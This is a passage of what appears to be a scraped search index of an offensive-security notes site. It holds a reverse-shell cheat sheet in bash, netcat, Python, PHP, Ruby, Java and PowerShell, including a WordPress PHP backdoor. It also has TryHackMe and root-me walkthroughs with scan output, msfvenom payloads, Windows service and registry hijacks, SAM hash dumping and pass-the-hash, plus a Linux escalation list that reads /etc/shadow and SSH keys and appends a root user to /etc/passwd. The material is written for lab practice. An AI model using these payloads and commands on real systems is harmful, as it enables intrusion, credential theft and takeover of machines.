Linux reverse shells  Netcat: nc <IP address attack machine> <port-number> -e /bin/sh Netcat Traditional (like the one on Kali): rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP address attack machine> <port-number> >/tmp/f;/tmp/f Python: python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<IP address attack machine>\",<port-number>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' Bash: bash -i >& /dev/tcp/<IP address attack machine>/<port-number> 0>&1 PHP: php -r '$sock=fsockopen(\"<IP address attack machine>\",<port-number>);exec(\"/bin/sh -i <&3 >&3 2>&3\");' PHP alternative 1: php -r '$sock=fsockopen(\"<IP address attack machine>\",<port-number>);$proc = proc_open('/bin/sh -i', array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);' PHP alternative 2: <?php exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP address attack machine> <port-number> >/tmp/f'); ?> PHP WordPress: <?php if(is_home()) { exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP address attack machine> <port-number> >/tmp/f'); } ?> Ruby: ruby -rsocket -e'f=TCPSocket.open(\"<IP address attack machine>\",<port-number>).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)' Java: r = Runtime.getRuntime() p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/<IP address attack machine>/<port-number>;cat <&5 | while read line; do \\$line 2>&5 >&5; done\"] as String[]) p.waitFor() Windows server reverse shells  The standard one-liner PSH reverse shell: powershell -c \"$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port-number>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\" Copy into a cmd.exe shell or another method of executing commands on a Windows server, such as a webshell.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "1e27ba9b97d8bc1eae28400d5c9b1633",
    "u": "https://exploitation.tymyrddin.dev/docs/thm/internal",
    "t": "Internal ",
    "c": "https://tryhackme.com/room/internal Internal  The lead is a straight forward exploit of Wordpress, followed by exploitation that requires manual enumeration of the host file system. A Jenkins server is found running internally that leads to a Docker container, to a … Add target IP address to /etc/hosts , mapped to internal.thm . Scanning  Run a simple port scan (without Ping) nmap -Pn -p- <IP target> -oN portscan portscan: # Nmap 7.92 scan initiated Mon Oct 3 01:52:19 2022 as: nmap -Pn -p- -oN portscan -vv 10.10.239.250 Nmap scan report for 10.10.239.250 Host is up, received user-set (0.050s latency). Scanned at 2022-10-03 01:52:19 BST for 61s Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE REASON 22/tcp open ssh syn-ack ttl 63 80/tcp open http syn-ack ttl 63 Read data files from: /usr/bin/../share/nmap # Nmap done at Mon Oct 3 01:53:20 2022 -- 1 IP address (1 host up) scanned in 61.35 seconds Run an -A scan on the open ports: nmap -Pn -T4 -A -p80,135,139,445,3389,49663,49667,49669 <IP target> -oN servicescan servicescan: # Nmap 7.92 scan initiated Mon Oct 3 02:11:37 2022 as: nmap -Pn -T4 -A -p22,80 -oN servicescan 10.10.239.250 Nmap scan report for 10.10.239.250 Host is up (0.042s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA) | 256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA) |_ 256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-title: Apache2 Ubuntu Default Page: It works |_http-server-header: Apache/2.4.29 (Ubuntu) Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Adtran 424RG FTTH gateway (92%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.2 - 4.9 (92%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 22/tcp) HOP RTT ADDRESS 1 42.42 ms 10.9.0.1 2 42.41 ms 10.10.239.250 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Mon Oct 3 02:11:49 2022 -- 1 IP address (1 host up) scanned in 12.11 seconds Exploring  http://internal.thm Find files and folders  gobuster dir -u http://<IP target> -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt -t 50 Results: =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.239.250 [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Extensions: php,html,txt [+] Timeout: 10s =============================================================== 2022/10/03 01:57:45 Starting gobuster in directory enumeration mode =============================================================== /blog (Status: 301) [Size: 313] [--> http://10.10.239.250/blog/] /index.html (Status: 200) [Size: 10918] /wordpress (Status: 301) [Size: 318] [--> http://10.10.239.250/wordpress/] ... =============================================================== 2022/10/03 02:10:43 Finished =============================================================== Wordpress enumeration  wpscan --url http://<IP target>/blog -e u Results: _______________________________________________________________ __ _______ _____ \\ \\ / / __ \\ / ____| \\ \\ /\\ / /| |__) | (___ ___ __ _ _ __ ® \\ \\/ \\/ / | ___/ \\___ \\ / __|/ _` | '_ \\ \\ /\\ / | | ____) | (__| (_| | | | | \\/ \\/ |_| |_____/ \\___|\\__,_|_| |_| WordPress Security Scanner by the WPScan Team Version 3.8.22 @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart _______________________________________________________________ [i] Updating the Database ... [i] Update completed. [+] URL: http://10.10.239.250/blog/ [10.10.239.250] [+] Started: Mon Oct 3 02:16:15 2022 Interesting Finding(s): [+] Headers | Interesting Entry: Server: Apache/2.4.29 (Ubuntu) | Found By: Headers (Passive Detection) | Confidence: 100% [+] XML-RPC seems to be enabled: http://10.10.239.250/blog/xmlrpc.php | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: | - http://codex.wordpress.org/XML-RPC_Pingback_API | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/ | - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/ [+] WordPress readme found: http://10.10.239.250/blog/readme.html | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] The external WP-Cron seems to be enabled: http://10.10.239.250/blog/wp-cron.php | Found By: Direct Access (Aggressive Detection) | Confidence: 60% | References: | - https://www.iplocation.net/defend-wordpress-from-ddos | - https://github.com/wpscanteam/wpscan/issues/1299 [+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10). | Found By: Emoji Settings (Passive Detection) | - http://10.10.239.250/blog/, Match: 'wp-includes\\/js\\/wp-emoji-release.min.js?ver=5.4.2' | Confirmed By: Meta Generator (Passive Detection) | - http://10.10.239.250/blog/, Match: 'WordPress 5.4.2' [i] The main theme could not be detected. [+] Enumerating Users (via Passive and Aggressive Methods) Brute Forcing Author IDs - Time: 00:00:00 <==> (10 / 10) 100.00% Time: 00:00:00 [i] User(s) Identified: [+] admin | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection) [!] No WPScan API Token given, as a result vulnerability data has not been output. [!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register [+] Finished: Mon Oct 3 02:16:17 2022 [+] Requests Done: 65 [+] Cached Requests: 4 [+] Data Sent: 14.272 KB [+] Data Received: 19.132 MB [+] Memory used: 163.422 MB [+] Elapsed time: 00:00:02 Brute-forcing the found password: wpscan --url http://<IP target>/blog -U admin -P /usr/share/wordlists/rockyou.txt Results: _______________________________________________________________ __ _______ _____ \\ \\ / / __ \\ / ____| \\ \\ /\\ / /| |__) | (___ ___ __ _ _ __ ® \\ \\/ \\/ / | ___/ \\___ \\ / __|/ _` | '_ \\ \\ /\\ / | | ____) | (__| (_| | | | | \\/ \\/ |_| |_____/ \\___|\\__,_|_| |_| WordPress Security Scanner by the WPScan Team Version 3.8.22 Sponsored by Automattic - https://automattic.com/ @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart _______________________________________________________________ [+] URL: http://10.10.239.250/blog/ [10.10.239.250] [+] Started: Mon Oct 3 02:17:58 2022 Interesting Finding(s): [+] Headers | Interesting Entry: Server: Apache/2.4.29 (Ubuntu) | Found By: Headers (Passive Detection) | Confidence: 100% [+] XML-RPC seems to be enabled: http://10.10.239.250/blog/xmlrpc.php | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: | - http://codex.wordpress.org/XML-RPC_Pingback_API | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/ | - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/ [+] WordPress readme found: http://10.10.239.250/blog/readme.html | Found By: Direct Access (Aggressive Detection)...",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "96e97a14e9f4269f319327ee8c8baf29",
    "u": "https://exploitation.tymyrddin.dev/docs/thm/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  Not an exhaustive list of escalation methods, but does include some “edge-case” tactics that may be seen in CTF exercises and challenges. Why?  To build experience with tree climbing and monkeying about. How?  Windows PrivEsc Linux PrivEsc Steel Mountain Alfred HackPark Game Zone Skynet The Daily Bugle Overpass 2 hacked Relevant Internal Mr Robot",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "c4bab2a6a5d1a31627d141343b180042",
    "u": "https://exploitation.tymyrddin.dev/docs/thm/win-privesc",
    "t": "Windows PrivEsc ",
    "c": "https://tryhackme.com/room/windows10privesc Windows PrivEsc  This room is excellent for reinforcement of the most common Windows privilege escalation techniques. Generate a reverse shell executable  On Kali, generate a reverse shell executable ( reverse.exe ) using msfvenom . Update the LHOST IP address accordingly: msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f exe -o reverse.exe Transfer the reverse.exe file to the C:\\PrivEsc directory on Windows. There are many ways you could do this, and the simplest is to start an SMB server on Kali in the same directory as the file, and then use the standard Windows copy command to transfer the file. On Kali, in the same directory as reverse.exe: sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali . On Windows (update the IP address with your Kali IP): copy \\\\10.10.10.10\\kali\\reverse.exe C:\\PrivEsc\\reverse.exe Test the reverse shell by setting up a netcat listener on Kali: sudo nc -nvlp 53 Then run the reverse.exe executable on Windows and catch the shell: C:\\PrivEsc\\reverse.exe The reverse.exe executable will be used in many of the tasks, so do not delete it! Service exploits - Insecure service permissions  Use accesschk.exe to check the user account’s permissions on the daclsvc service: C:\\PrivEsc\\accesschk.exe /accepteula -uwcqv user daclsvc Note that the “user” account has the permission to change the service config ( SERVICE_CHANGE_CONFIG ). Query the service and note that it runs with SYSTEM privileges ( SERVICE_START_NAME ): sc qc daclsvc Modify the service config and set the BINARY_PATH_NAME ( binpath ) to the reverse.exe executable you created: sc config daclsvc binpath= \"\\\"C:\\PrivEsc\\reverse.exe\\\"\" Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges: net start daclsvc Questions  What is the original BINARY_PATH_NAM E of the daclsvc service? Answer: C:\\Program Files\\DACL Service\\daclservice.exe Service exploits - Unquoted service path  Query the unquotedsvc service and note that it runs with SYSTEM privileges ( SERVICE_START_NAME ) and that the BINARY_PATH_NAME is unquoted and contains spaces. sc qc unquotedsvc Using accesschk.exe , note that the BUILTIN\\Users group is allowed to write to the C:\\Program Files\\Unquoted Path Service\\ directory: C:\\PrivEsc\\accesschk.exe /accepteula -uwdq \"C:\\Program Files\\Unquoted Path Service\\\" Copy the reverse.exe executable you created to this directory and rename it Common.exe : copy C:\\PrivEsc\\reverse.exe \"C:\\Program Files\\Unquoted Path Service\\Common.exe\" Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges: net start unquotedsvc Questions  What is the BINARY_PATH_NAME of the unquotedsvc service? Answer: C:\\Program Files\\Unquoted Path Service\\Common Files\\unquotedpathservice.exe Service exploits - Weak registry permissions  Query the regsvc service and note that it runs with SYSTEM privileges ( SERVICE_START_NAME ). sc qc regsvc Using accesschk.exe , note that the registry entry for the regsvc service is writable by the NT AUTHORITY\\INTERACTIVE group (essentially all logged-on users): C:\\PrivEsc\\accesschk.exe /accepteula -uvwqk HKLM\\System\\CurrentControlSet\\Services\\regsvc Overwrite the ImagePath registry key to point to the reverse.exe executable you created: reg add HKLM\\SYSTEM\\CurrentControlSet\\services\\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\\PrivEsc\\reverse.exe /f Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges: net start regsvc Service exploits - Insecure service executables  Query the filepermsvc service and note that it runs with SYSTEM privileges ( SERVICE_START_NAME ). sc qc filepermsvc Using accesschk.exe , note that the service binary ( BINARY_PATH_NAME ) file is writable by everyone: C:\\PrivEsc\\accesschk.exe /accepteula -quvw \"C:\\Program Files\\File Permissions Service\\filepermservice.exe\" Copy the reverse.exe executable you created and replace the filepermservice.exe with it: copy C:\\PrivEsc\\reverse.exe \"C:\\Program Files\\File Permissions Service\\filepermservice.exe\" /Y Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges: net start filepermsvc Registry - AutoRuns  Query the registry for AutoRun executables: reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run Using accesschk.exe , note that one of the AutoRun executables is writable by everyone: C:\\PrivEsc\\accesschk.exe /accepteula -wvu \"C:\\Program Files\\Autorun Program\\program.exe\" Copy the reverse.exe executable you created and overwrite the AutoRun executable with it: copy C:\\PrivEsc\\reverse.exe \"C:\\Program Files\\Autorun Program\\program.exe\" /Y Start a listener on Kali and then restart the Windows VM. Open up a new RDP session to trigger a reverse shell running with admin privileges. You should not have to authenticate to trigger it, however if the payload does not fire, log in as an admin ( admin/password123 ) to trigger it. Note that in a real world engagement, you would have to wait for an administrator to log in themselves! rdesktop MACHINE_IP Registry - AlwaysInstallElevated  Query the registry for AlwaysInstallElevated keys: reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated Note that both keys are set to 1 ( 0x1 ). On Kali, generate a reverse shell Windows Installer (reverse.msi) using msfvenom. Update the LHOST IP address accordingly: msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f msi -o reverse.msi Transfer the reverse.msi file to the C:\\PrivEsc directory on Windows (use the SMB server method from earlier). Start a listener on Kali and then run the installer to trigger a reverse shell running with SYSTEM privileges: msiexec /quiet /qn /i C:\\PrivEsc\\reverse.msi Passwords - Registry  The registry can be searched for keys and values that contain the word “password”: reg query HKLM /f password /t REG_SZ /s If you want to save some time, query this specific key to find admin AutoLogon credentials: reg query \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\winlogon\" On Kali, use the winexe command to spawn a command prompt running with the admin privileges (update the password with the one you found): winexe -U 'admin%password' //MACHINE_IP cmd.exe Questions  What was the admin password found in the registry? Answer: password123 Passwords - Saved creds  List any saved credentials: cmdkey /list Note that credentials for the admin user are saved. If they aren’t, run the C:\\PrivEsc\\savecred.bat script to refresh the saved credentials. Start a listener on Kali and run the reverse.exe executable using runas with the admin user’s saved credentials: runas /savecred /user:admin C:\\PrivEsc\\reverse.exe Passwords - Security Account Manager (SAM)  The SAM and SYSTEM files can be used to extract user password hashes. This VM has insecurely stored backups of the SAM and SYSTEM files in the C:\\Windows\\Repair\\ directory. Transfer the SAM and SYSTEM files to the Kali VM: copy C:\\Windows\\Repair\\SAM \\\\10.10.10.10\\kali\\ copy C:\\Windows\\Repair\\SYSTEM \\\\10.10.10.10\\kali\\ On Kali, clone the creddump7 repository (the one on Kali is outdated and will not dump hashes correctly for Windows 10!) and use it to dump out the hashes from the SAM and SYSTEM files: git clone https://github.com/Tib3rius/creddump7 pip3 install pycrypto python3 creddump7/pwdump.py SYSTEM SAM Crack the admin NTLM hash using hashcat : hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt Use the cracked password to log in as the admin using winexe or RDP. Questions  What is the NTLM hash of the admin user? Answer: a9fdfa038c4b75ebc76dc855dd74f0da Passwords - Passing the Hash  Why crack a password hash when you can authenticate using the hash? Use the full admin hash with pth-winexe to spawn a shell...",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "2a7ceadde51260968a3ccf889432af67",
    "u": "https://exploitation.tymyrddin.dev/docs/root-me/bash-unquoted-exp",
    "t": "Bash: unquoted expression injection ",
    "c": "Bash: unquoted expression injection  root-me challenge: Bash - unquoted expression injection : Bypass this script’s security to recover the validation password. ./somescript \"0 -o foo\" makes any condition become test 1234 -eq 0 -o foo This is the equivalent of 1234 == 0 || \"foo\" in other languages, with one irrelevant comparison OR ’d with the truth value of the string foo . All non-empty strings are considered to be true, so this expression is always true.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "48591e4bca22dfc3fe011c951dbcc8b8",
    "u": "https://exploitation.tymyrddin.dev/docs/linux/escalation",
    "t": "Reuseful escalation patterns ",
    "c": "Reuseful escalation patterns  Shell  Upgrade to bash: python -c 'import pty; pty.spawn(\"/bin/bash\")' Host Information  Get OS version, patches, etc.: /bin/uname -a /usr/bin/lsb_release -a /bin/cat /etc/*-release User Information  Get current user: /usr/bin/whoami /usr/bin/id Get user command history: /bin/cat /home/$(whoami)/.bash_history /bin/cat /home/$(whoami)/.nano_history /bin/cat /home/$(whoami)/.vim_history /bin/cat /home/$(whoami)/.atftp_history /bin/cat /home/$(whoami)/.mysql_history /bin/cat /home/$(whoami)/.php_history Get environment variables and PATH: set /bin/echo $PATH Reset $PATH and environment variables: set -a source /etc/environment . ~/ set +a List users: /bin/cat /etc/passwd /bin/cat /etc/group /bin/cat /etc/sudoers Attempt to list hashed passwords: /bin/cat /etc/shadow Current logon and last logon: /usr/bin/w /usr/bin/last SSH information: cat ~/.ssh/authorized_keys cat ~/.ssh/identity.pub cat ~/.ssh/identity cat ~/.ssh/id_rsa.pub cat ~/.ssh/id_rsa cat ~/.ssh/id_dsa.pub cat ~/.ssh/id_dsa cat /etc/ssh/ssh_config cat /etc/ssh/sshd_config cat /etc/ssh/ssh_host_dsa_key.pub cat /etc/ssh/ssh_host_dsa_key cat /etc/ssh/ssh_host_rsa_key.pub cat /etc/ssh/ssh_host_rsa_key cat /etc/ssh/ssh_host_key.pub cat /etc/ssh/ssh_host_key Services  Current processes: /bin/ps -ef | /bin/grep root /bin/ps -ef | /bin/grep $(whoami) /bin/netstat -at /bin/netstat -atnl /bin/ss Tasks  List cron jobs: /usr/bin/crontab -l /bin/ls -alh /var/spool/cron /bin/ls -al /etc/ | grep cron /bin/ls -al /etc/cron* /bin/cat /etc/cron* /bin/cat /etc/at.allow /bin/cat /etc/at.deny /bin/cat /etc/cron.allow /bin/cat /etc/cron.deny Network  List network configuration: /sbin/ifconfig /sbin/iwconfig /sbin/ip a /bin/cat /etc/network/interfaces /bin/cat /etc/sysconfig/network /bin/cat /etc/resolv.conf /bin/cat /etc/sysconfig/network /bin/cat /etc/networks /sbin/ifconfig -aiptables -L /bin/hostname /bin/dnsdomainname Programs and Binaries  Search for installed programs or binaries: /bin/ls -lha /bin /bin/ls -lha /usr/bin /bin/ls -lha /opt/ /bin/ls -lha /sbin/ /bin/ls -lha /var/cache/apt/archivesO /bin/ls -lha /var/cache/yum/* dpkg -l rpm -qa Weak Permissions  SUID/SGID, RWX, Current User: /usr/bin/find / -type f -perm 0777 2>/dev/null /usr/bin/find / -user $(whoami) 2>/dev/null /bin/ls -ahlR /home/ /bin/ls -ahlR /root/ Files from specific group: find / -group <group> 2>/dev/null Find writable files (newer systems): /usr/bin/find / -perm /6000 2> /dev/null /usr/bin/find / -perm /4000 2> /dev/null /usr/bin/find / -perm -g=s -o -perm /4000 ! -type l -maxdepth 3 -exec /bin/ls -ld {} \\; 2>/dev/null /usr/bin/find / -perm /222 -type d 2>/dev/null Find writable files (older systems): /usr/bin/find / -perm +6000 2> /dev/null /usr/bin/find / -perm +4000 2> /dev/null /usr/bin/find / -perm -g=s -o -perm +4000 ! -type l -maxdepth 3 -exec /bin/ls -ld {} \\; 2>/dev/null /usr/bin/find / -perm -222 -type d 2>/dev/null Sudo Permissions  Attempt sudo: /usr/bin/sudo su - See if anything can run with sudo: /usr/bin/sudo -l Mail  Find mail files: /bin/cat /var/mail/root /bin/cat /var/mail/${whoami} /bin/cat /var/spool/mail/root /bin/cat /var/spool/mail/${whoami} File System  Mounted drives: /bin/df -lh /bin/cat /etc/fstab /bin/mount | column -t Files  Search for potentially sensitive files: /usr/bin/find / -type f -name \"*.txt\" 2> /dev/null /usr/bin/find / -type f -name \"*.log\" 2> /dev/null /usr/bin/find / -type f -name \"*.sh\" 2> /dev/null /usr/bin/find / -type f -name \"*.rar\" 2> /dev/null /usr/bin/find / -type f -name \"*.zip\" 2> /dev/null /usr/bin/find / -type f -name \"*.tar\" 2> /dev/null /usr/bin/find / -type f -name \"*.gz\" 2> /dev/null /usr/bin/find / -type f -name \"*.pdf\" 2> /dev/null /usr/bin/find / -type f -name \"*.xls\" 2> /dev/null /usr/bin/find / -type f -name \"*.xlsx\" 2> /dev/null /usr/bin/find / -type f -name \"*.xml\" 2> /dev/null /usr/bin/find / -type f -name \"*server.xml\" 2> /dev/null /usr/bin/find / -name *name* 2> /dev/null /usr/bin/find / -type f -iname \".*\" -ls 2> /dev/null /usr/bin/find -maxdepth 2 -type f -ls -exec file -b {} \\; Elevations  If the user can sudo with nmap: sudo nmap --interactive Then escape: !sh If /etc/passwd is writable: openssl passwd -1 -salt <user> <password> Then run above output with: echo \"<user>:<output>:0:0:root:/root:/bin/bash\" >> /etc/passwd If a SUID file has relative instead of absolute path (example if binary backup runs cat /etc/shadow then make a file called cat : echo \"<exploit-code\" > cat chmod +x cat Then update PATH and run: export PATH=~/:$PATH ./backup",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "cbc0ff0753e5bdaa701e8a702577eaf9",
    "u": "https://exploitation.tymyrddin.dev/docs/linux/path",
    "t": "Path exploits ",
    "c": "Path exploits  Become root on Linux using path: Search for files with incorrectly installed authorities that are on PATH Change PATH Use script or program Example  What folders are located under $PATH ? $ echo $PATH Does current user have write privileges for any of these folders? find / -writable 2>/dev/null | cut -d \"/\" -f 2,3 | grep -v proc | sort Can $PATH be modified? Is there a script/application that will be affected by this vulnerability? Notes  Not really exploit usage, but based on files with incorrectly installed authorities.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "79b5a8f636bc305fc914fd759112bf09",
    "u": "https://exploitation.tymyrddin.dev/docs/thm/steel-mountain",
    "t": "Steel Mountain ",
    "c": "https://tryhackme.com/room/steelmountain Steel Mountain  Use Metasploit for initial access, Powershell for Windows privilege escalation enumeration, and gain Administrator access. Exploring  Looking in web developer tools that employee of the months name is Bill Harper. Not much more to find. Scanning  # nmap -sV -sC -oN nmap.out -p- <IP address target> -vv Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-27 12:08 BST NSE: Loaded 155 scripts for scanning. NSE: Script Pre-scanning. NSE: Starting runlevel 1 (of 3) scan. ... PORT STATE SERVICE REASON VERSION 80/tcp open http syn-ack ttl 127 Microsoft IIS httpd 8.5 | http-methods: | Supported Methods: OPTIONS TRACE GET HEAD POST |_ Potentially risky methods: TRACE |_http-title: Site doesn't have a title (text/html). |_http-server-header: Microsoft-IIS/8.5 135/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 139/tcp open netbios-ssn syn-ack ttl 127 Microsoft Windows netbios-ssn 445/tcp open microsoft-ds syn-ack ttl 127 Microsoft Windows Server 2008 R2 - 2012 microsoft-ds 3389/tcp open ssl/ms-wbt-server? syn-ack ttl 127 |_ssl-date: 2022-09-27T11:14:36+00:00; +1s from scanner time. | rdp-ntlm-info: | Target_Name: STEELMOUNTAIN | NetBIOS_Domain_Name: STEELMOUNTAIN | NetBIOS_Computer_Name: STEELMOUNTAIN | DNS_Domain_Name: steelmountain | DNS_Computer_Name: steelmountain | Product_Version: 6.3.9600 |_ System_Time: 2022-09-27T11:14:30+00:00 | ssl-cert: Subject: commonName=steelmountain | Issuer: commonName=steelmountain | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha1WithRSAEncryption | Not valid before: 2022-09-26T10:48:42 | Not valid after: 2023-03-28T10:48:42 | MD5: de63 ecf7 7e35 7106 8f5c 1c09 8bbd b962 | SHA-1: 5fed 6ce6 c851 ced0 7438 3d16 79b1 0c4a ba24 9eb4 | -----BEGIN CERTIFICATE----- | MIIC3jCCAcagAwIBAgIQUqJCfCl2laFPtSD8fRzcnTANBgkqhkiG9w0BAQUFADAY | MRYwFAYDVQQDEw1zdGVlbG1vdW50YWluMB4XDTIyMDkyNjEwNDg0MloXDTIzMDMy | ODEwNDg0MlowGDEWMBQGA1UEAxMNc3RlZWxtb3VudGFpbjCCASIwDQYJKoZIhvcN | AQEBBQADggEPADCCAQoCggEBAMSQ6HyI9K8HNV1A7y8umYrrUQ4+SIPPI1GWRLDG | nPTfflFnzQnpp80SAAEeALwv8jqHdmNS+Seb3og8HkobdelA04RqbIn1hL1ndVC2 | TSJe7APAHeDsUKZ67Oc9gJaz/H1WUSKKj6OwJtzPV6ztXpgQ7Md4y2k4C0Bt38NJ | 17sCIgVujSwIv6P+/Zvrqse4hH9ByuKf8SAIRcA0+TymHjCo/2UFv6GYetvfhgha | 558VxK6pF1utC3FIBfGv09g3h/OCw0dzXU0b+DVaGYurdJbn2IwmAEbzpq7y3eXr | 5/r/D87h+yuHREXZTH+pE389SrShxwmhIhu27KyyaCmGko8CAwEAAaMkMCIwEwYD | VR0lBAwwCgYIKwYBBQUHAwEwCwYDVR0PBAQDAgQwMA0GCSqGSIb3DQEBBQUAA4IB | AQAJF4GL6/L/eeEj112WEUQbf94qZk3aB60b47aHMayns+/+gA8+7SvTlt+pUhJ/ | Bmy0EJbfI1LnxDTKXVHLX/dMErsEke/9M40LYXaDsDj+84J2TChvFpKAV6tidDBV | Gl4gZXfkE5WuPpTM3Tuz9AopUPxf5ljEIQ0Fw7SZlTTl0+1dbRV7WPBnaB2IP/AF | UFa6QRro1SOV+rnbOEH1zerqMVfijuOcJ0+42D+3iN/+M7bdN8oQV0fzYUGqBvdi | ivoioB4At/x/10RM5pE3IAHoEoAHTy57BKwjdFcBwpKx4KZEJchkn7/fDeaxr/DS | brcpY8CvUwNziw9oREDY1I8d |_-----END CERTIFICATE----- 5985/tcp open http syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 8080/tcp open http syn-ack ttl 127 HttpFileServer httpd 2.3 | http-methods: |_ Supported Methods: GET HEAD POST |_http-server-header: HFS 2.3 |_http-favicon: Unknown favicon MD5: 759792EDD4EF8E6BC2D1877D27153CB1 |_http-title: HFS / 47001/tcp open http syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 49152/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49153/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49154/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49155/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49156/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49169/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49170/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows Host script results: | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | nbstat: NetBIOS name: STEELMOUNTAIN, NetBIOS user: <unknown>, NetBIOS MAC: 02:bc:49:69:fa:bd (unknown) | Names: | STEELMOUNTAIN<00> Flags: <unique><active> | WORKGROUP<00> Flags: <group><active> | STEELMOUNTAIN<20> Flags: <unique><active> | Statistics: | 02 bc 49 69 fa bd 00 00 00 00 00 00 00 00 00 00 00 | 00 00 00 00 00 00 00 00 00 00 00 00 00 